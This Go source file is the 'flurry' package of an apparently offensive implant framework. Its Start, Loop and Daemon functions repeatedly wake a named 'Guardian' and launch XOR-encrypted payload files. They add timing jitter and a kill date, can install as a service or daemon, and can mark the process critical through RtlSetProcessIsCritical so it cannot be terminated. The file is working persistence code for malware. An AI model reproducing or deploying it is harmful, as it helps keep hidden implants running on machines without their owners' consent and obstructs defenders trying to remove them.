// Copyright (C) 2020 - 2024 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

// Package flurry contains the functions for launching a Flurry instance.
package flurry

import (
	"context"
	"os"
	"sync/atomic"
	"syscall"
	"time"

	"github.com/iDigitalFlame/xmt/com/limits"
	"github.com/iDigitalFlame/xmt/data/crypto"
	"github.com/iDigitalFlame/xmt/device"
	"github.com/iDigitalFlame/xmt/man"
	"github.com/iDigitalFlame/xmt/util"
)

// Start attempts to create a Flurry instance with the supplied arguments.
//
// This function will block and will NOT return (it calls 'device.GoExit').
//
// Arguments:
//
//	critical - If True, take advantage of 'RtlSetProcessIsCritical' WinAPI call
//	            (Windows only obviously). And will make itself un-terminatable
//	            while running.
//	killdate - If this is not zero, this specifies the date when this Flurry will
//	            stop functioning. This is represented in Unix epoch time.
//	l        - Guardian Linker type to use. If nil, will default to 'Pipe'.
//	guard    - String name for the Guardian to look for/create. DO NOT FORMAT
//	            THIS NAME, it will be formatted based on the Linker type.
//	key      - Encryption key as a bytes array used to XOR decrypt/unwrap the
//	            data in the supplied files list.
//	files    - List of files to check against. Each file will be checked in a
//	            random order and is expected to be encrypted using the supplied
//	            key value.
func Start(critical bool, killdate int64, l man.Linker, guard string, key []byte, files []string) {
	Loop(0, critical, killdate, l, guard, key, files)
}
func loop(wait time.Duration, critical bool, k time.Time, l man.Linker, g string, key []byte, files []string) {
	var (
		x, y = context.WithCancel(context.Background())
		w    = make(chan os.Signal, 1)
		t    = time.NewTicker(wait)
		s    uint32
		z    bool
	)
	if limits.MemorySweep(x); critical {
		z, _ = device.SetCritical(true)
	}
	limits.Notify(w, syscall.SIGINT, syscall.SIGTERM)
loop:
	for time.Sleep(time.Millisecond * time.Duration(100+util.FastRandN(500))); ; {
		select {
		case <-w:
			break loop
		case n := <-t.C:
			if !k.IsZero() && n.After(k) {
				break loop
			}
			if atomic.LoadUint32(&s) == 1 {
				// NOTE(dij): We don't swap here to prevent overriting the
				//            one in the goroutine.
				break
			}
			atomic.StoreUint32(&s, 1) // Block further calls to Wake until we're done.
			go func() {
				man.WakeMultiFile(l, g, crypto.XOR(key), files)
				atomic.StoreUint32(&s, 0)
			}()
		}
	}
	t.Stop()
	limits.StopNotify(w)
	close(w)
	if y(); critical && !z {
		device.SetCritical(false)
	}
}

// Loop attempts to create a Flurry instance with the supplied arguments. This
// function will run 'Start' every 'wait' duration and will run until it receives
// a SIGINT or SIGTERM to shut down safely.
//
// This function will block and will NOT return (it calls 'device.GoExit').
//
// Arguments:
//
//	wait     - Duration period to be used to run 'Start' with the arguments
//	            supplied. If this is less than or equal to zero, this function
//	            will run 'Start' and bail.
//	critical - If True, take advantage of 'RtlSetProcessIsCritical' WinAPI call
//	            (Windows only obviously). And will make itself un-terminatable
//	            while running.
//	killdate - If this is not zero, this specifies the date when this Flurry will
//	            stop functioning. This is represented in Unix epoch time.
//	l        - Guardian Linker type to use. If nil, will default to 'Pipe'.
//	guard    - String name for the Guardian to look for/create. DO NOT FORMAT
//	            THIS NAME, it will be formatted based on the Linker type.
//	key      - Encryption key as a bytes array used to XOR decrypt/unwrap the
//	            data in the supplied files list.
//	files    - List of files to check against. Each file will be checked in a
//	            random order and is expected to be encrypted using the supplied
//	            key value.
func Loop(wait time.Duration, critical bool, killdate int64, l man.Linker, guard string, key []byte, files []string) {
	defer func() {
		if err := recover(); err != nil {
			device.GoExit()
		}
	}()
	var (
		g = checkGuard(l, guard)
		k time.Time
	)
	if killdate != 0 {
		k = time.Unix(killdate, 0)
	}
	limits.Ignore()
	if len(g) > 0 && (k.IsZero() || time.Now().Before(k)) {
		if wait <= 0 {
			time.Sleep(time.Millisecond * time.Duration(100+util.FastRandN(500)))
			man.WakeMultiFile(l, g, crypto.XOR(key), files)
		} else {
			loop(wait, critical, k, l, g, key, files)
		}
	}
	limits.Reset()
	device.GoExit()
}

// Daemon will start the process of locating and triggering a Guardian as a *nix
// daemon or a Windows service. This function will run 'Start' every 'wait'
// duration and will run until it receives a SIGINT or SIGTERM to shut down safely.
// (or a ServiceStop message in the case of Windows)
//
// Arguments:
//
//	t        - Duration period to be used to run 'Start' with the arguments
//	            supplied. If this is less than or equal to zero, this function
//	            will run 'Start' and bail.
//	name     - The service name when running under Windows. This may empty as it
//	            is ignored under *nix.
//	critical - If True, take advantage of 'RtlSetProcessIsCritical' WinAPI call
//	            (Windows only obviously). And will make itself un-terminatable
//	            while running.
//	killdate - If this is not zero, this specifies the date when this Flurry will
//	            stop functioning. This is represented in Unix epoch time.
//	l        - Guardian Linker type to use. If nil, will default to 'Pipe'.
//	guard    - String name for the Guardian to look for/create. DO NOT FORMAT
//	            THIS NAME, it will be formatted based on the Linker type.
//	key      - Encryption key as a bytes array used to XOR decrypt/unwrap the
//	            data in the supplied files list.
//	files    - List of files to check against. Each file will be checked in a
//	            random order
func Daemon(t time.Duration, name string, critical bool, killdate int64, l man.Linker, guard string, key []byte, files []string) {
	var k time.Time
	if killdate != 0 {
		k = time.Unix(killdate, 0)
	}
	if len(guard) > 0 && (k.IsZero() || time.Now().Before(k)) {
		var (
			x, f = context.WithCancel(context.Background())
			g    = checkGuard(l, guard)
			z    bool
		)
		if critical {
			z, _ = device.SetCritical(true)
		}
		limits.Ignore()
		limits.MemorySweep(x)
		device.DaemonTicker(name, t, func(_ context.Context) error {
			if !k.IsZero() && time.Now().After(k) {
				return device.ErrQuit
			}
			man.WakeMultiFile(l, g, crypto.XOR(key), files)
			return nil
		})
		if critical && !z {
			device.SetCritical(false)
		}
		f()
	}
	device.GoExit()
}
